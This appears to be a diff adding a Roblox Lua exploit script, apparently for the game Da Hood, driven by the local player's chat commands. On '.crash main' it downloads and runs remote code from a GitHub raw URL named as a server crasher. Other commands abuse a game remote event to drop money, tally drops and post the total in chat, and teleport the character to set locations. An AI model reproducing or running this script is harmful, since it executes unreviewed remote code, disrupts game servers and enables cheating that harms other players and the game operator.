@@ -1,0 +1,72 @@
+local dropping = false
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ".crash main" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
+wait(1)
+    end
+end)
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ".drop main" then
+    dropping = true
+    game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
+wait(1)
+end
+end)
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ".stop main" then
+    dropping = false
+end
+wait(1)
+end)
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ".cash" then
+    local amt = 0
+    for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
+        if v.Name == "MoneyDrop" then
+        local cur = string.split(v.BillboardGui.TextLabel.Text,"$")[2]
+						if string.match(cur,',') then
+							amt = amt + cur:gsub("%,","")
+						else
+							amt = amt + cur
+						end
+						print(string.split(v.BillboardGui.TextLabel.Text,'$')[2])
+					end
+				end
+				function fornum(amt)
+					amt = tostring(amt)
+					return amt:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
+				end
+                wait(2)
+				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(fornum(amt).."cm", 'All')
+end
+wait(1)
+end)
+
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ".setup admin" then
+wait(1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872.18127441406, -32.649211883545, -531.76177978516)
+wait(1)
+    end
+end)
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ".setup bank" then
+wait(1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-407.96932983398, 21.749994277954, -297.27017211914)
+wait(1)
+    end
+end)
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg == ".setup basketball" then
+wait(1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-865.14288330078, 43.999835968018, -482.26336669922)
+wait(1)
+    end
+end)
